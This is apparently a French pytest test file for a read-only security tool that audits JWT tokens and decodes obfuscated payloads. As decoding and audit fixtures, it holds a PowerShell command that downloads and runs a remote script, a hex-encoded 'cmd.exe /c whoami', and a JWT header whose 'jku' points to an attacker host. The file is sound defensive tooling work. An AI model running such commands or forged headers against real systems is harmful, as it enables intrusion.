"""Analyse d'artefacts : jetons JWT et charges obfusquées.

Aucun test n'accède au réseau — et pour ces deux outils ce n'est pas seulement
une commodité de test, c'est la propriété qui les rend utilisables : un jeton
est un secret, une charge obfusquée est une pièce à conviction.

Les cas de décodage ci-dessous viennent d'essais qui avaient **échoué** : trois
défauts réels ont été trouvés en éprouvant le module sur des charges
réalistes, et chacun a son test.
"""

from __future__ import annotations

import base64
import gzip
import json
import time
from typing import Any

import pytest

from artefact_mcp.decodage import decoder
from artefact_mcp.jwt import JwtError, auditer, lire
from artefact_mcp.tools import analyze_jwt, decode_payload


# --------------------------------------------------------------------------
# Fabrique de jetons
# --------------------------------------------------------------------------
def _b64url(donnees: bytes) -> str:
    return base64.urlsafe_b64encode(donnees).decode().rstrip("=")


def _jeton(entete: dict[str, Any], revendications: dict[str, Any]) -> str:
    return (
        f"{_b64url(json.dumps(entete).encode())}."
        f"{_b64url(json.dumps(revendications).encode())}.signature"
    )


MAINTENANT = int(time.time())


# --------------------------------------------------------------------------
# Lecture d'un jeton
# --------------------------------------------------------------------------
def test_un_jeton_est_lu_sans_pretendre_le_verifier() -> None:
    """La propriété que le champ `signature_verified` existe pour rappeler."""
    lu = lire(_jeton({"alg": "RS256"}, {"sub": "u1", "exp": MAINTENANT + 60}))

    assert lu.algorithm == "RS256"
    assert lu.subject == "u1"
    assert lu.signature_verified is False
    assert any("PAS vérifiée" in n for n in lu.notes)


def test_le_prefixe_bearer_est_tolere() -> None:
    """Un jeton copié depuis un en-tête traîne presque toujours son préfixe."""
    brut = _jeton({"alg": "RS256"}, {"sub": "u1"})

    assert lire(f"Bearer {brut}").subject == "u1"


@pytest.mark.parametrize(
    ("mauvais", "attendu"),
    [
        ("", "Aucun jeton"),
        ("abc", "trois segments"),
        ("a.b", "trois segments"),
        ("a.b.c.d.e", "JWE"),
    ],
)
def test_un_jeton_malforme_le_dit_clairement(mauvais: str, attendu: str) -> None:
    with pytest.raises(JwtError) as erreur:
        lire(mauvais)

    assert attendu in str(erreur.value)


def test_un_jwe_est_distingue_d_un_jws() -> None:
    """Cinq segments : chiffré, donc illisible sans la clé.

    Le dire évite qu'un analyste conclue à un jeton corrompu.
    """
    with pytest.raises(JwtError) as erreur:
        lire("a.b.c.d.e")

    assert "chiffré" in str(erreur.value)


def test_le_remplissage_base64url_est_retabli() -> None:
    """Les JWT retirent le `=` final — l'oublier est l'erreur la plus fréquente."""
    lu = lire(_jeton({"alg": "HS256"}, {"sub": "abcde"}))

    assert lu.claims["sub"] == "abcde"


# --------------------------------------------------------------------------
# Audit — ce que l'outil doit voir
# --------------------------------------------------------------------------
def test_alg_none_est_signale() -> None:
    """La faille JWT la plus classique, toujours rencontrée."""
    audit = auditer(lire(_jeton({"alg": "none"}, {"aud": "api", "exp": MAINTENANT + 60})))

    assert any("NON SIGNÉ" in f for f in audit.findings)


def test_une_url_de_cle_dans_l_entete_est_signalee() -> None:
    """`jku` sans liste blanche laisse l'attaquant fournir sa propre clé."""
    audit = auditer(
        lire(_jeton({"alg": "RS256", "jku": "https://mechant.example/k"}, {"aud": "api"}))
    )

    assert any("jku" in f for f in audit.findings)


def test_un_algorithme_symetrique_est_signale() -> None:
    audit = auditer(lire(_jeton({"alg": "HS256"}, {"aud": "api", "exp": MAINTENANT + 60})))

    assert any("symétrique" in f for f in audit.findings)


def test_un_jeton_expire_est_signale() -> None:
    audit = auditer(lire(_jeton({"alg": "RS256"}, {"aud": "api", "exp": MAINTENANT - 3600})))

    assert audit.expired is True
    assert any("EXPIRÉ" in f for f in audit.findings)


def test_l_absence_d_expiration_est_signalee() -> None:
    """Un jeton sans `exp` reste valable jusqu'à révocation de la clé."""
    audit = auditer(lire(_jeton({"alg": "RS256"}, {"aud": "api"})))

    assert audit.expired is None
    assert any("Aucune expiration" in f for f in audit.findings)


def test_l_absence_d_audience_est_signalee() -> None:
    """Sans `aud`, le jeton se rejoue contre un autre service."""
    audit = auditer(lire(_jeton({"alg": "RS256"}, {"exp": MAINTENANT + 60})))

    assert any("Aucune audience" in f for f in audit.findings)


def test_une_duree_de_vie_longue_est_signalee() -> None:
    audit = auditer(
        lire(
            _jeton(
                {"alg": "RS256"},
                {"aud": "api", "iat": MAINTENANT, "exp": MAINTENANT + 86400 * 3},
            )
        )
    )

    assert audit.lifetime_seconds == 86400 * 3
    assert any("Durée de vie" in f for f in audit.findings)


def test_un_jeton_correct_ne_declenche_aucun_constat() -> None:
    """Un garde-fou trop large signalerait des jetons parfaitement sains."""
    audit = auditer(
        lire(
            _jeton(
                {"alg": "RS256", "typ": "JWT", "kid": "k1"},
                {
                    "iss": "https://sts.exemple/",
                    "sub": "u1",
                    "aud": "https://api.exemple",
                    "iat": MAINTENANT,
                    "exp": MAINTENANT + 3600,
                },
            )
        )
    )

    assert audit.findings == []


async def test_les_permissions_entra_sont_rendues_en_clair() -> None:
    """C'est ce que le porteur peut réellement faire."""
    analyse = await analyze_jwt(
        token=_jeton(
            {"alg": "RS256"},
            {
                "aud": "https://graph.microsoft.com",
                "roles": ["Directory.Read.All", "AuditLog.Read.All"],
                "tid": "7bdea2a2",
                "iat": MAINTENANT,
                "exp": MAINTENANT + 3600,
            },
        )
    )

    assert set(analyse.permissions) == {"Directory.Read.All", "AuditLog.Read.All"}
    assert any("portée large" in f for f in analyse.findings)
    assert analyse.signature_verified is False


# --------------------------------------------------------------------------
# Décodage — les trois défauts trouvés en éprouvant le module
# --------------------------------------------------------------------------
def test_une_commande_powershell_encodee_est_decodee() -> None:
    """Le cas qui motive l'outil : `-enc` produit de l'UTF-16LE en base64."""
    commande = "IEX (New-Object Net.WebClient).DownloadString('http://exemple/a.ps1')"
    charge = base64.b64encode(commande.encode("utf-16-le")).decode()

    resultat = decoder(charge)

    assert commande in resultat.decoded
    assert [c.encoding for c in resultat.layers] == ["base64"]


def test_un_texte_en_clair_n_est_pas_decode_a_tort() -> None:
    """Premier défaut trouvé.

    Un texte dont l'alphabet ressemble à du base64 traversait trois couches
    imaginaires et ressortait en octets aléatoires. Un décodage n'est retenu
    que s'il AMÉLIORE la charge.
    """
    resultat = decoder("ceci est du texte normal, rien a decoder")

    assert resultat.layers == []
    assert resultat.decoded == "ceci est du texte normal, rien a decoder"


def test_un_double_encodage_est_retire_exactement_deux_fois() -> None:
    """Même défaut, vu de l'autre côté : ni trop, ni trop peu."""
    interne = "charge interne secrete"
    charge = base64.b64encode(base64.b64encode(interne.encode()).decode().encode()).decode()

    resultat = decoder(charge)

    assert resultat.decoded == interne
    assert len(resultat.layers) == 2


def test_l_hexadecimal_n_est_pas_pris_pour_du_base64() -> None:
    """Deuxième défaut trouvé.

    L'alphabet hexadécimal est un sous-ensemble de celui du base64 :
    `cmd.exe /c whoami` encodé en hexadécimal était lu comme du base64 et rendu
    en charabia.
    """
    resultat = decoder(b"cmd.exe /c whoami".hex())

    assert resultat.decoded == "cmd.exe /c whoami"
    assert [c.encoding for c in resultat.layers] == ["hexadécimal"]


def test_un_flux_gzip_est_decompresse_et_non_traite_comme_un_aboutissement() -> None:
    """Troisième défaut trouvé.

    La signature gzip arrêtait la cascade juste avant la décompression : le
    contenu, pourtant lisible, ressortait en hexadécimal.
    """
    interne = "contenu compresse puis encode"
    charge = base64.b64encode(gzip.compress(interne.encode())).decode()

    resultat = decoder(charge)

    assert interne in resultat.decoded
    assert [c.encoding for c in resultat.layers] == ["base64", "gzip"]


def test_une_url_encodee_est_decodee() -> None:
    resultat = decoder("http%3A%2F%2Fexemple%2Fa%3Fb%3D1")

    assert resultat.decoded == "http://exemple/a?b=1"


@pytest.mark.parametrize(
    ("magie", "attendu"),
    [
        (b"MZ\x90\x00", "PE"),
        (b"\x7fELF", "ELF"),
        (b"%PDF-1.7", "PDF"),
        (b"PK\x03\x04", "ZIP"),
    ],
)
def test_un_fichier_est_reconnu_a_sa_signature_et_non_execute(magie: bytes, attendu: str) -> None:
    """Le résultat n'est pas du texte à lire : son empreinte suffit."""
    resultat = decoder(base64.b64encode(magie + b"\x00" * 64).decode())

    assert resultat.file_type is not None
    assert attendu in resultat.file_type
    assert resultat.is_text is False
    assert any("ne l'exécutez pas" in f for f in resultat.findings)


def test_un_empilement_profond_est_signale() -> None:
    """L'empilement caractérise l'outillage autant que le contenu."""
    charge = "texte suffisamment long pour survivre aux encodages"
    for _ in range(3):
        charge = base64.b64encode(charge.encode()).decode()

    resultat = decoder(charge)

    assert len(resultat.layers) == 3
    assert any("couches empilées" in f for f in resultat.findings)


def test_la_profondeur_maximale_est_respectee() -> None:
    charge = "texte suffisamment long pour survivre aux encodages"
    for _ in range(5):
        charge = base64.b64encode(charge.encode()).decode()

    resultat = decoder(charge, profondeur_max=2)

    assert len(resultat.layers) == 2


async def test_l_outil_rend_les_couches_traversees() -> None:
    resultat = await decode_payload(payload=base64.b64encode(b"charge lisible ici").decode())

    assert resultat.decoded == "charge lisible ici"
    assert [c.encoding for c in resultat.layers] == ["base64"]
    assert any("Couches retirées" in n for n in resultat.notes)


# --------------------------------------------------------------------------
# Composition du serveur
# --------------------------------------------------------------------------
async def test_le_serveur_n_annonce_aucun_acces_reseau() -> None:
    from artefact_mcp.server import build_server

    outils = await build_server().list_tools()

    assert len(outils) == 2
    for outil in outils:
        assert outil.annotations is not None
        assert outil.annotations.read_only_hint is True
        assert outil.annotations.open_world_hint is False
